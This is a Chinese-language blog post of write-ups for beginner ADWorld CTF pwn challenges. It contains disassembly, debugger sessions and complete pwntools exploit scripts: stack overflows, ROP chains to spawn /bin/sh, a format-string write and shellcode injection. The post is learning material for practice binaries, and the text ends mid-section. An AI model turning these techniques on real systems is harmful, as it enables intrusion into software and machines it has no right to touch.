---
title: "ADWorld 0"
date: 2021-08-03T14:14:45+08:00
draft: false
---

# get_shell

直接nc连接上去，然后cat flag

# Hello_Pwn

```bash
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x0000000000400520  puts@plt
0x0000000000400530  setbuf@plt
0x0000000000400540  system@plt
0x0000000000400550  alarm@plt
0x0000000000400560  read@plt
0x0000000000400570  __libc_start_main@plt
0x0000000000400580  __gmon_start__@plt
```

查看一下main函数

```bash
; DATA XREF from entry0 @ 0x4005ad
┌ 104: int main (int argc, char **argv, char **envp);
│           0x0040069b      55             push rbp
│           0x0040069c      4889e5         mov rbp, rsp
│           0x0040069f      bf3c000000     mov edi, 0x3c               ; '<' ; 60
│           0x004006a4      e8a7feffff     call sym.imp.alarm
│           0x004006a9      488b05a80920.  mov rax, qword [obj.stdout] ; [0x601058:8]=0
│           0x004006b0      be00000000     mov esi, 0                  ; char *buf
│           0x004006b5      4889c7         mov rdi, rax                ; FILE *stream
│           0x004006b8      e873feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x004006bd      bfa1074000     mov edi, str.welcome_to_ctf ; 0x4007a1 ; "~~ welcome to ctf ~~     " ; const char *s
│           0x004006c2      e859feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006c7      bfbb074000     mov edi, str.lets_get_helloworld_for_bof ; 0x4007bb ; "lets get helloworld for bof" ; const char *s
│           0x004006cc      e84ffeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006d1      ba10000000     mov edx, 0x10               ; rdx ; size_t nbyte
│           0x004006d6      be68106000     mov esi, 0x601068           ; rsi ; void *buf
│           0x004006db      bf00000000     mov edi, 0                  ; int fildes
│           0x004006e0      e87bfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x004006e5      8b0581092000   mov eax, dword [0x0060106c] ; [0x60106c:4]=0
│           0x004006eb      3d6161756e     cmp eax, 0x6e756161
│       ┌─< 0x004006f0      750a           jne 0x4006fc
│       │   0x004006f2      b800000000     mov eax, 0
│       │   0x004006f7      e88affffff     call fcn.00400686
│       │   ; CODE XREF from main @ 0x4006f0
│       └─> 0x004006fc      b800000000     mov eax, 0
│           0x00400701      5d             pop rbp
└           0x00400702      c3             ret
```

cmp中与0x6e756161比较的数值来自eax，而eax来自[0x0060106c]即read输入的地址0x601068+4

构造EXP

```bash
from pwn import *

p = process("./hellopwn")
#p = remote("111.198.29.45",53314)

payload = b'a' * 4
payload += p64(0x6e756161)
p.sendlineafter("lets get helloworld for bof\n",payload)

p.interactive()
```

# Level 0

```bash
vincebye@ubuntu:~/ctf/adworld/level0$ rabin2 -z 291721f42a044f50a2aead748d539df0 
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000684 0x00400684 7   8    .rodata ascii /bin/sh
1   0x0000068c 0x0040068c 13  14   .rodata ascii Hello, World\n
vincebye@ubuntu:~/ctf/adworld/level0$ ./291721f42a044f50a2aead748d539df0 
Hello, World

vincebye@ubuntu:~/ctf/adworld/level0$ rabin2 -i 291721f42a044f50a2aead748d539df0 
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400450 GLOBAL FUNC       write
2   0x00400460 GLOBAL FUNC       system
3   0x00400470 GLOBAL FUNC       read
4   0x00400480 GLOBAL FUNC       __libc_start_main
5   0x00400490 WEAK   NOTYPE     __gmon_start__

vincebye@ubuntu:~/ctf/adworld/level0$ rabin2 -qs 291721f42a044f50a2aead748d539df0 | grep -ve imp -e ' 0 '
0x00600a58 1 completed.6661
0x00400670 2 __libc_csu_fini
0x004005a6 32 vulnerable_function
0x00400596 16 callsystem
0x00400680 4 _IO_stdin_used
0x00400600 101 __libc_csu_init
0x004005c6 47 main
vincebye@ubuntu:~/ctf/adworld/level0$ gdb 291721f42a044f50a2aead748d539df0 
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 194 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from 291721f42a044f50a2aead748d539df0...(no debugging symbols found)...done.
pwndbg> checksec
[*] '/home/vincebye/ctf/adworld/level0/291721f42a044f50a2aead748d539df0'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

pwndbg> disassemble vulnerable_function
Dump of assembler code for function vulnerable_function:
   0x00000000004005a6 <+0>:	push   rbp
   0x00000000004005a7 <+1>:	mov    rbp,rsp
   0x00000000004005aa <+4>:	add    rsp,0xffffffffffffff80
   0x00000000004005ae <+8>:	lea    rax,[rbp-0x80]
   0x00000000004005b2 <+12>:	mov    edx,0x200
   0x00000000004005b7 <+17>:	mov    rsi,rax
   0x00000000004005ba <+20>:	mov    edi,0x0
   0x00000000004005bf <+25>:	call   0x400470 <read@plt>
   0x00000000004005c4 <+30>:	leave  
   0x00000000004005c5 <+31>:	ret    
End of assembler dump.
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004005c6 <+0>:	push   rbp
   0x00000000004005c7 <+1>:	mov    rbp,rsp
   0x00000000004005ca <+4>:	sub    rsp,0x10
   0x00000000004005ce <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005d1 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005d5 <+15>:	mov    edx,0xd
   0x00000000004005da <+20>:	mov    esi,0x40068c
   0x00000000004005df <+25>:	mov    edi,0x1
   0x00000000004005e4 <+30>:	call   0x400450 <write@plt>
   0x00000000004005e9 <+35>:	mov    eax,0x0
   0x00000000004005ee <+40>:	call   0x4005a6 <vulnerable_function>
   0x00000000004005f3 <+45>:	leave  
   0x00000000004005f4 <+46>:	ret    
End of assembler dump.
pwndbg> disassemble callsystem
Dump of assembler code for function callsystem:
   0x0000000000400596 <+0>:	push   rbp
   0x0000000000400597 <+1>:	mov    rbp,rsp
   0x000000000040059a <+4>:	mov    edi,0x400684
   0x000000000040059f <+9>:	call   0x400460 <system@plt>
   0x00000000004005a4 <+14>:	pop    rbp
   0x00000000004005a5 <+15>:	ret
```

关键信息

```bash

2   0x00400460 GLOBAL FUNC       system
0   0x00400684 7   8    .rodata ascii /bin/sh

```

[有关64位ELF栈偏移计算理论支持](https://www.mi1k7ea.com/2019/04/09/%E8%92%B8%E7%B1%B3ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#0x02-64%E4%BD%8DROP)

计算栈偏移

```bash
pwndbg> cy 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
pwndbg> r
Starting program: /home/vincebye/ctf/adworld/level0/291721f42a044f50a2aead748d539df0 
Hello, World
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

Program received signal SIGSEGV, Segmentation fault.
0x00000000004005c5 in vulnerable_function ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x12d
 RBX  0x0
 RCX  0x7ffff7af2151 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x200
 RDI  0x0
 RSI  0x7fffffffde60 ◂— 0x6161616261616161 ('aaaabaaa')
 R8   0x7ffff7dced80 (initial) ◂— 0x0
 R9   0x7ffff7dced80 (initial) ◂— 0x0
 R10  0x3
 R11  0x246
 R12  0x4004a0 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdfe0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x6261616962616168 ('haabiaab')
 RSP  0x7fffffffdee8 ◂— 0x6261616b6261616a ('jaabkaab')
 RIP  0x4005c5 (vulnerable_function+31) ◂— ret    
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x4005c5 <vulnerable_function+31>    ret    <0x6261616b6261616a>

─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdee8 ◂— 0x6261616b6261616a ('jaabkaab')
01:0008│     0x7fffffffdef0 ◂— 0x6261616d6261616c ('laabmaab')
02:0010│     0x7fffffffdef8 ◂— 0x6261616f6261616e ('naaboaab')
03:0018│     0x7fffffffdf00 ◂— 0x6261617162616170 ('paabqaab')
04:0020│     0x7fffffffdf08 ◂— 0x6261617362616172 ('raabsaab')
05:0028│     0x7fffffffdf10 ◂— 0x6261617562616174 ('taabuaab')
06:0030│     0x7fffffffdf18 ◂— 0x6261617762616176 ('vaabwaab')
07:0038│     0x7fffffffdf20 ◂— 0x6261617962616178 ('xaabyaab')
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0         0x4005c5 vulnerable_function+31
   f 1 0x6261616b6261616a
   f 2 0x6261616d6261616c
   f 3 0x6261616f6261616e
   f 4 0x6261617162616170
   f 5 0x6261617362616172
   f 6 0x6261617562616174
   f 7 0x6261617762616176
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l jaab
136
```

现在要找一个Gadget把字符串存入RDI

```bash
vincebye@ubuntu:~/ctf/adworld/level0$ ROPgadget --binary 291721f42a044f50a2aead748d539df0 --only "pop|ret" |grep rdi
0x0000000000400663 : pop rdi ; ret
```

最后大概是这么个结构'A'*136+pop_rdi+bash_addr+system

```bash
~~from zio import *
payload=b'A'*136
payload+=l64(0x0000000000400663)
payload+=l64(0x00400684)
payload+=l64(0x000000000040059f)

io=zio('./level0')
io.writeline(payload)
io.read()~~
```

```bash
from pwn import *

p = process("./level0")
#p = remote("111.198.29.45",53314)

payload = b'a' * 136
payload += p64(0x0000000000400663)
payload += p64(0x00400684)
payload +=p64(0x000000000040059f)
p.sendlineafter("Hello, World\n",payload)

p.interactive()
```

PS:下面的脚本是对的，上面是错的，弄了一晚上原因是因为对于ZIO和Pwntool这两个库没有深入了解，只是依样画葫芦的用而已

若是将上面的system地址修改为plt地址，则会因为堆栈不平衡而报错,PS:如何修复堆栈还不太会

```bash
vincebye@ubuntu:~/ctf/adworld/level0$ python3 3.py 
[+] Starting local process './level0': pid 40509
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ whoami
[*] Process './level0' stopped with exit code -11 (SIGSEGV) (pid 40509)
[*] Got EOF while sending in interactive
Traceback (most recent call last):
  File "/home/vincebye/.local/lib/python3.6/site-packages/pwnlib/tubes/process.py", line 777, in close
    fd.close()
BrokenPipeError: [Errno 32] Broken pipe
```

# Level2

```bash
; DATA XREF from entry0 @ 0x8048367
┌ 51: int main (int32_t arg_4h);
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg int32_t arg_4h @ esp+0x24
│           0x08048480      8d4c2404       lea ecx, [arg_4h]
│           0x08048484      83e4f0         and esp, 0xfffffff0
│           0x08048487      ff71fc         push dword [ecx - 4]
│           0x0804848a      55             push ebp
│           0x0804848b      89e5           mov ebp, esp
│           0x0804848d      51             push ecx
│           0x0804848e      83ec04         sub esp, 4
│           0x08048491      e8b5ffffff     call sym.vulnerable_function
│           0x08048496      83ec0c         sub esp, 0xc
│           0x08048499      684c850408     push str.echo__Hello_World  ; 0x804854c ; "echo 'Hello World!'" ; const char *string
│           0x0804849e      e87dfeffff     call sym.imp.system         ; int system(const char *string)
│           0x080484a3      83c410         add esp, 0x10
│           0x080484a6      b800000000     mov eax, 0
│           0x080484ab      8b4dfc         mov ecx, dword [var_4h]
│           0x080484ae      c9             leave
│           0x080484af      8d61fc         lea esp, [ecx - 4]
└           0x080484b2      c3             ret
[0x08048480]> s sym.vulnerable_function
[0x0804844b]> pdf
            ; CALL XREF from main @ 0x8048491
┌ 53: sym.vulnerable_function ();
│           ; var void *buf @ ebp-0x88
│           0x0804844b      55             push ebp
│           0x0804844c      89e5           mov ebp, esp
│           0x0804844e      81ec88000000   sub esp, 0x88
│           0x08048454      83ec0c         sub esp, 0xc
│           0x08048457      6840850408     push str.echo_Input:        ; 0x8048540 ; "echo Input:" ; const char *string
│           0x0804845c      e8bffeffff     call sym.imp.system         ; int system(const char *string)
│           0x08048461      83c410         add esp, 0x10
│           0x08048464      83ec04         sub esp, 4
│           0x08048467      6800010000     push 0x100                  ; 256 ; size_t nbyte
│           0x0804846c      8d8578ffffff   lea eax, [buf]
│           0x08048472      50             push eax                    ; void *buf
│           0x08048473      6a00           push 0                      ; int fildes
│           0x08048475      e896feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x0804847a      83c410         add esp, 0x10
│           0x0804847d      90             nop
│           0x0804847e      c9             leave
└           0x0804847f      c3             ret
```

用GDB一运行就报错出去了，我不会这道题，虽然定级很简单,网上搜了一圈WP，基本都是用的IDA查看的源码，就没有用GDB调试，哎，总是逃避一个又一个错误，其实并没有真的解决

```bash
0x08048320 system地址
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000540 0x08048540 11  12   .rodata ascii echo Input:
1   0x0000054c 0x0804854c 19  20   .rodata ascii echo 'Hello World!'
0   0x00001024 0x0804a024 7   8    .data   ascii /bin/sh

```

看vulnerable_function代码可见buf的大小为0x88+0x4(140),构造EXP

```bash
~~from pwn import *

p = process("./level2")
#p = remote("111.198.29.45",53314)

payload = b'a' * 148
payload += b'b'*4
payload += p32(0x08048320)
payload += p32(0x0804a024)
p.sendlineafter("Input:\n",payload)

p.interactive()~~
```

```bash
from pwn import *
p = process("./level2")
#p = remote("111.198.29.45",53314)
elf=ELF("level2")
system_addr=elf.plt['system']
#system_addr=elf.got['system']
payload=b'a'*140
payload += p32(system_addr)
payload +=p32(1)
payload += p32(0x0804a024)
p.sendlineafter("Input:\n",payload)

p.interactive()
```

sym.imp.system的地址并不是system函数的地址

# String

~~依旧不会，放入IDA中F5失败了~~

main的函数

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // ST88_8@1
  _DWORD *v4; // rax@1
  __int64 v5; // ST18_8@1
  __int64 result; // rax@1
  __int64 v7; // rdx@1

  v3 = *MK_FP(__FS__, 40LL);
  setbuf(stdout, 0LL);
  alarm(0x3Cu);
  sub_400996(60LL, 0LL);
  v4 = malloc(8uLL);
  v5 = (__int64)v4;
  *v4 = 68;
  v4[1] = 85;
  puts("we are wizard, we will give you hand, you can not defeat dragon by yourself ...");
  puts("we will tell you two secret ...");
  printf("secret[0] is %x\n", v5, a2);
  printf("secret[1] is %x\n", v5 + 4);
  puts("do not tell anyone ");
  sub_400D72(v5);
  puts("The End.....Really?");
  result = 0LL;
  v7 = *MK_FP(__FS__, 40LL) ^ v3;
  return result;
}

```

sub_400D72函数

```c
__int64 __fastcall sub_400D72(__int64 a1)
{
  char s; // [sp+10h] [bp-20h]@1
  __int64 v3; // [sp+28h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("What should your character's name be:");
  _isoc99_scanf("%s", &s);
  if ( strlen(&s) <= 0xC )
  {
    puts("Creating a new player.");
    sub_400A7D("Creating a new player.");
    sub_400BB9();
    sub_400CA6(a1);
  }
  else
  {
    puts("Hei! What's up!");
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

sub_400A7D函数

```c
__int64 sub_400A7D()
{
  char s1; // [sp+0h] [bp-10h]@2
  __int64 v2; // [sp+8h] [bp-8h]@1

  v2 = *MK_FP(__FS__, 40LL);
  puts(" This is a famous but quite unusual inn. The air is fresh and the");
  puts("marble-tiled ground is clean. Few rowdy guests can be seen, and the");
  puts("furniture looks undamaged by brawls, which are very common in other pubs");
  puts("all around the world. The decoration looks extremely valuable and would fit");
  puts("into a palace, but in this city it's quite ordinary. In the middle of the");
  puts("room are velvet covered chairs and benches, which surround large oaken");
  puts("tables. A large sign is fixed to the northern wall behind a wooden bar. In");
  puts("one corner you notice a fireplace.");
  puts("There are two obvious exits: east, up.");
  puts("But strange thing is ,no one there.");
  puts("So, where you will go?east or up?:");
  while ( 1 )
  {
    _isoc99_scanf("%s", &s1);
    if ( !strcmp(&s1, "east") || !strcmp(&s1, "east") )
      break;
    puts("hei! I'm secious!");
    puts("So, where you will go?:");
  }
  if ( strcmp(&s1, "east") )
  {
    if ( !strcmp(&s1, "up") )
      sub_4009DD(&s1, "up");
    puts("YOU KNOW WHAT YOU DO?");
    exit(0);
  }
  return *MK_FP(__FS__, 40LL) ^ v2;
}
```

sub_4009DD函数

```c
void __noreturn sub_4009DD()
{
  unsigned int v0; // eax@1
  int v1; // eax@2
  int v2; // [sp+0h] [bp-10h]@2
  unsigned int v3; // [sp+4h] [bp-Ch]@2
  __int64 v4; // [sp+8h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  puts("You go right, suddenly, a big hole appear front you!");
  puts("where you will go?!left(0) or right(1)?!:");
  v0 = time(0LL);
  srand(v0);
  while ( 1 )
  {
    v1 = rand();
    v3 = ((((unsigned int)v1 >> 31) + (_BYTE)v1) & 1) - ((unsigned int)v1 >> 31);
    _isoc99_scanf("%d", &v2);
    if ( v2 != v3 )
      break;
    puts("You escape it!but another hole appear!");
    puts("where you will go?!left(0) or right(1)?!:");
  }
  puts("YOU ARE DEAD");
  exit(0);
}
```

sub_400BB9函数

```c
__int64 sub_400BB9()
{
  int v1; // [sp+4h] [bp-7Ch]@1
  __int64 v2; // [sp+8h] [bp-78h]@1
  char format; // [sp+10h] [bp-70h]@2
  __int64 v4; // [sp+78h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  v2 = 0LL;
  puts("You travel a short distance east.That's odd, anyone disappear suddenly");
  puts(", what happend?! You just travel , and find another hole");
  puts("You recall, a big black hole will suckk you into it! Know what should you do?");
  puts("go into there(1), or leave(0)?:");
  _isoc99_scanf("%d", &v1);
  if ( v1 == 1 )
  {
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    _isoc99_scanf("%ld", &v2);
    puts("And, you wish is:");
    _isoc99_scanf("%s", &format);
    puts("Your wish is");
    printf(&format, &format);
    puts("I hear it, I hear it....");
  }
  return *MK_FP(__FS__, 40LL) ^ v4;
}
```

sub_400CA6函数

```c
__int64 __fastcall sub_400CA6(__int64 a1)
{
  void *v1; // rsi@2
  __int64 v3; // [sp+18h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!");
  puts("Dragon say: HaHa! you were supposed to have a normal");
  puts("RPG game, but I have changed it! you have no weapon and ");
  puts("skill! you could not defeat me !");
  puts("That's sound terrible! you meet final boss!but you level is ONE!");
  if ( *(_DWORD *)a1 == *(_DWORD *)(a1 + 4) )
  {
    puts("Wizard: I will help you! USE YOU SPELL");
    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
    read(0, v1, 0x100uLL);
    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

做到这里就不会了，预估是利用printf(&format, &format);在前面生成的随机地址处写入值

将format赋值为%x,%x,%x...%x，得到第7个参数与我们输入的v2的值是一致的

```c
'Give me an address'
136
And, you wish is:
%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
Your wish is
13da97e3,13daa8c0,13acd224,c,0,13da52a0,88,252c7825,2c78252c,78252c78,252c7825,78252cI hear it, I hear it....
```

而在main函数中

```c
  v5 = (__int64)v4;
  *v4 = 68;
  v4[1] = 85;
  printf("secret[0] is %x\n", v5, a2);
  printf("secret[1] is %x\n", v5 + 4);
  puts("do not tell anyone ");
  sub_400D72(v5);
```

可知函数传入的参数为v5，而v5又与v4绑定，v4[0]=68,v4[1]=85,这样我们就可以结合前面得出的偏移和格式化字符串漏洞将v4[0]修改为85

在sub_400ca6中

```c
    puts("Wizard: I will help you! USE YOU SPELL");
    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
    read(0, v1, 0x100uLL);
    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);
```

将v1转化为可执行函数，我们就在此处写入一个shell,构造的EXP如下

```c
from pwn import *
p = process("./String")
# p = remote("111.198.29.45","49404")
context(arch='amd64', os='linux', log_level='debug')
p.recvuntil('secret[0] is ')
v4_addr = int(p.recvuntil('\n')[:-1], 16)
p.sendlineafter("What should your character's name be:", 'a')
p.sendlineafter("So, where you will go?east or up?:", 'east')
p.sendlineafter("go into there(1), or leave(0)?:", '1')
p.sendlineafter("'Give me an address'", str(int(v4_addr)))
p.sendlineafter("And, you wish is:", '%85c%7$n')
shellcode = asm(shellcraft.sh())
p.sendlineafter("USE YOU SPELL", shellcode)
p.interactive()
```

> 获得执行system(“/bin/sh”)汇编代码所对应的机器码： asm([shellcraft.sh](http://shellcraft.sh/)()) 。注意要指明arch和os。arch有i386(x86)和amd64(x64)。攻防世界的题解区有人说这个函数失效，其实是因为他没指明环境。不同环境下的汇编代码是不同的。-攻防世界WP区
> 

# Guess_num

看了IDA的反汇编的代码也是毫无头绪，看了WP之后感觉有个点是不知道的就是在IDA点击一个变量名可以看到他与其他变量的偏移关系，000000000030处就是gets(&v10)中的v10

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa8e31d9-cadf-482f-8a2a-c254c5e79493/Untitled.png)

构造EXP

```c
from pwn import *
from ctypes import *  #python的一个外部函数库

libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")  #调用DLL中输出的C接口函数
 
payload = b'a'*32 + p64(1) 
p=process("guessnum")
#p = remote('111.198.29.45',50351)
libc.srand(1)
p.sendlineafter('name:',payload) 
for i in range(10):  #输入以1为seed，前十次所产生的伪随机数
    p.sendlineafter('number:',str(libc.rand()%6 + 1)) 
p.interactive()
```

> ctypes是Python的外部函数库。它提供C兼容的数据类型，并允许在DLL或共享库中调用函数。它可以用于将这些库包装在纯Python中。
> 

# int_overflow

> C 库函数 void *memset(void *str, int c, size_t n) 复制字符 c（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符。
> 

> ssize_t read(int fd, void * buf, size_t count);
函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.
> 

若是read第一个数字应该是从接受输入，将输入的前count个字符传送到buf指针所指的内存中

不会做啊啊啊啊

只有字符在3-8这个长度才能到存在溢出的函数处，但是这样就没有办法溢出了呀,看了WP

先看main函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+Ch] [bp-Ch]@1

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("---------------------");
  puts("~~ Welcome to CTF! ~~");
  puts("       1.Login       ");
  puts("       2.Exit        ");
  puts("---------------------");
  printf("Your choice:");
  __isoc99_scanf("%d", &v4);
  if ( v4 == 1 )
  {
    login();
  }
  else
  {
    if ( v4 == 2 )
    {
      puts("Bye~");
      exit(0);
    }
    puts("Invalid Choice!");
  }
  return 0;
}
```

直接看login函数

```c
char *login()
{
  char buf; // [sp+0h] [bp-228h]@1
  char s; // [sp+200h] [bp-28h]@1

  memset(&s, 0, 0x20u);
  memset(&buf, 0, 0x200u);
  puts("Please input your username:");
  read(0, &s, 0x19u);
  printf("Hello %s\n", &s);
  puts("Please input your passwd:");
  read(0, &buf, 0x199u);
  return check_passwd(&buf);
}
```

check_passwd函数

```c
char *__cdecl check_passwd(char *s)
{
  char *result; // eax@3
  char dest; // [sp+4h] [bp-14h]@3
  unsigned __int8 v3; // [sp+Fh] [bp-9h]@1

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Invalid Password");
    result = (char *)fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    result = strcpy(&dest, s);
  }
  return result;
}
```

这里要注意的几个点

- read函数第一个参数为0则不读取文件了，read(0, &s, 0x19u)大意为从键盘输入取前0x19个字符然后赋值给s
- int8即声明大小为8个bit大小，unsigned 则表明8个字符，无符号位，大小则为0~255

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3e75f011-2915-43a2-9b0f-db0125872f92/Untitled.png)

可以看到s为0x14大小时即可影响栈内的内容

此时我们构造EXP

```c
from pwn import *

p = process("./intoverflow")
# p = remote("111.198.29.45",53314)

payload = b'a' * 0x14
payload+=b'b'*4 #EBP
payload += p32(0x08048694)
payload +=b'c'*(260-4-0x14-4)

p.sendlineafter("choice:","1")
p.sendlineafter("username:\n","aa")
p.sendlineafter("passwd:\n",payload)

p.interactive()
```

# cgpwn2

```c
vincebye@ubuntu:~/ctf/adworld/cgpwn2$ checksec cgpwn2
[*] '/home/vincebye/ctf/adworld/cgpwn2/cgpwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
pwndbg> cyclic -l axaa
91
[0x08048450]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x080483e0 GLOBAL FUNC       setbuf
2   0x080483f0 GLOBAL FUNC       gets
3   0x08048400 GLOBAL FUNC       fgets
4   0x08048410 GLOBAL FUNC       puts
5   0x08048420 GLOBAL FUNC       system
6   0x08048430 WEAK   NOTYPE     __gmon_start__
7   0x08048440 GLOBAL FUNC       __libc_start_main

[0x08048450]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000700 0x08048700 11  12   .rodata ascii echo hehehe
1   0x0000070c 0x0804870c 24  25   .rodata ascii please tell me your name
2   0x00000728 0x08048728 38  39   .rodata ascii hello,you can leave some message here:
3   0x0000074f 0x0804874f 9   10   .rodata ascii thank you
```

## 思路1：写入cat flag命令

溢出的偏移为91，有system函数，思路是写入cat flag，然后调用system函数，有一个问题是这个空格该如何处理？

找写入的地址

```c
vincebye@ubuntu:~/ctf/adworld/cgpwn2$ readelf -S cgpwn2 
There are 30 section headers, starting at offset 0x1188:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481dc 0001dc 0000c0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          0804829c 00029c 000072 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804830e 00030e 000018 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048328 000328 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048348 000348 000020 08   A  5   0  4
  [10] .rel.plt          REL             08048368 000368 000038 08   A  5  12  4
  [11] .init             PROGBITS        080483a0 0003a0 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483d0 0003d0 000080 04  AX  0   0 16
  [13] .text             PROGBITS        08048450 000450 000292 00  AX  0   0 16
  [14] .fini             PROGBITS        080486e4 0006e4 000014 00  AX  0   0  4
  [15] .rodata           PROGBITS        080486f8 0006f8 000061 00   A  0   0  4
  [16] .eh_frame_hdr     PROGBITS        0804875c 00075c 00003c 00   A  0   0  4
  [17] .eh_frame         PROGBITS        08048798 000798 0000f8 00   A  0   0  4
  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000028 04  WA  0   0  4
  [24] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a040 001030 000074 00  WA  0   0 32
